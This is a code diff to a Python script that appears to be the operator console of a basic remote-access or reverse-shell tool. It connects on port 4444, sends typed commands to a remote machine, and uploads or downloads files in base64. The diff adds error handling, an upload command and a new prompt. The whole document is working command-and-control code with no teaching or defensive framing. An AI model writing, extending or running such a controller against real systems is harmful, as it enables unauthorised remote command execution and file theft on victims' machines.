@@ -1,7 +1,6 @@
-import socket, json, base64 # connect to server
-
-server_host = "localhost" # 192.168.0.81
-server_port = 4444
+import socket
+import json
+import base64
 
 class Connection:
     def __init__(self, server_host, server_port):
@@ -29,7 +28,7 @@ class Connection:
                 continue
     
     def execute_command(self, command):
-        if command.lower() == "exit":
+        if command == "exit":
             quit()
         self.json_send(command)
         return self.json_recieve()
@@ -41,30 +40,44 @@ class Connection:
     def read_file(self, path):
         try:
             with open(path, "rb") as file:
-                return base64.b64encode(file.read())
+                file_content = base64.b64encode(file.read()).decode('utf-8')
+                return file_content
         except Exception as e:
-            print(f"{str(e)}")
+            print(f"Server read_file brokie: {str(e)}")
+            return None
 
-    
-    def write_file(self, path, content): 
-         with open(path, "wb") as file:
-            file.write(base64.b64decode(content))
-            return "[Download Sucessful]"
+    def write_file(self, path, content):
+        try:
+            with open(path, "wb") as file:
+                file.write(base64.b64decode(content))
+                return "[Download Sucessful]"
+        except Exception as e:
+            print(f"Server write_file brokie: {str(e)}")
+            return None
               
     def run(self):
         while True:
             try:
-                command = input("Enter a command: ")
+                command = input(">> ")
                 command_word = command.split()
+
+                if command_word[0] == "upload":
+                    file_content = self.read_file(command_word[1])
+                    command_word.append(file_content)
+                    print(command_word)
                 
-                result = self.execute_command(command)
+                result = self.execute_command(command_word)
 
                 if command_word[0] == "download":
                     result = self.write_file(command_word[1], result)
 
                 print(result)
+
             except Exception as e:
-                print(f"{str(e)}")
+                print(f"Server run brokie: {str(e)}")
+
+server_host = "localhost" # 192.168.0.81
+server_port = 4444
 
 connection = Connection(server_host,server_port)
 connection.run()
